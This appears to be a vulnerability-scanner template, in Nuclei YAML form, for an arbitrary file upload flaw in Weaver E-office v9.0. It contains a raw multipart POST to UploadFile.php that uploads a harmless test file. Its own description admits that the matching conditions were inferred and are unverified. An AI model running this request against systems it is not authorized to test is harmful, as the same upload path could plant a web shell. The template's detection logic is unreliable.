id: poc-cfkdf1xulgo8nakd
info:
  name: 泛微 E-office v9.0 任意文件上传漏洞
  author: hacktwo
  severity: high
  description: '[!] 推断说明: 状态码缺失, 推断为 200。原文响应特征为截图, 无法自动提取文本命中条件, 使用前请人工核验。'
  tags: file-upload,2024
http:
- raw:
  - 'POST /general/index/UploadFile.php?m=uploadPicture&uploadType=eoffice_logo&userId= HTTP/1.1


    Content-Type: multipart/form-data; boundary=cd3e4e75b997661a11274a2267484e1d


    --cd3e4e75b997661a11274a2267484e1d


    Content-Disposition: form-data; name="Filedata"; filename="abc.txt"


    hiword123


    --cd3e4e75b997661a11274a2267484e1d--


    # 响应代码特征

    -1


    # 响应内容特征

    logo-eoffice.txt


    # 上传文件定位

    /images/logo/logo-eoffice.txt'
  redirects: false
  matchers:
  - status:
    - 200
    type: status
